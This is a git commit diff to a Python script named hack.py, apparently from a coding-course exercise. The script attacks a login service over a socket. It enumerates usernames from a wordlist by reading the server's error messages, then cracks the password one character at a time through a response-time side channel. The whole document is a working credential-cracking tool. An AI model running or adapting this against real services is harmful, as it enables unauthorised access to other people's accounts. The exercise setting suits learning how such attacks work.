0dd57f0222bfd4104e85e0dd22d740187814d757
Dewansh Rawat <dewanshrawat15@gmail.com>
2020-04-12 11:15:27 +0530

    Completed project with exploring different time vulnerabilities

--- task/hacking/hack.py
+++ task/hacking/hack.py
@@ -2,6 +2,7 @@
 import socket
 import sys
 import json
+import datetime
 
 args = sys.argv
 host = args[1]
@@ -21,46 +22,54 @@ def gen_new_password(password):
         yield new_password
 
 
-with socket.socket() as sock, open("logins.txt", "r") as src:
+delays = []
+
+with socket.socket() as sock:
     sock.connect(address)
-    for line in src:
-        d = str(line).strip("\n")
-        data = {
-            "login": d,
-            "password": ""
-        }
-        login_details = json.dumps(data)
-        sock.send(login_details.encode())
-        resp = sock.recv(1024)
-        response = json.loads(resp.decode())
-        res = response["result"]
-        if res == "Exception happened during login":
-            cracked_username = d
-            break
-    flag = 0
-    temp = ''
-    while True:
-        x = gen_new_password(temp)
-        for i in x:
+    with open("logins.txt", "r") as src:
+        for line in src:
+            d = str(line).strip("\n")
             data = {
-                "login": cracked_username,
-                "password": i
+                "login": d,
+                "password": ""
             }
             login_details = json.dumps(data)
             sock.send(login_details.encode())
             resp = sock.recv(1024)
             response = json.loads(resp.decode())
             res = response["result"]
-            if res == "Connection success!":
-                cracked_password = i
-                sock.close()
-                flag = 1
+            if res == "Wrong password!":
+                cracked_username = d
                 break
-            if res == "Exception happened during login":
-                temp = i
+        flag = 0
+        temp = ''
+        while True:
+            x = gen_new_password(temp)
+            for i in x:
+                data = {
+                    "login": cracked_username,
+                    "password": i
+                }
+                login_details = json.dumps(data)
+                start = datetime.datetime.now()
+                sock.send(login_details.encode())
+                resp = sock.recv(1024)
+                finish = datetime.datetime.now()
+                diff = finish - start
+                diff = diff.microseconds
+                response = json.loads(resp.decode())
+                res = response["result"]
+                if res == "Connection success!":
+                    cracked_password = i
+                    sock.close()
+                    flag = 1
+                    break
+                if res == "Wrong password!" and diff > 100000:
+                    temp = i
+                    max_delay = diff
+                    break
+            if flag == 1:
                 break
-        if flag == 1:
-            break
     sock.close()
 
 data = {
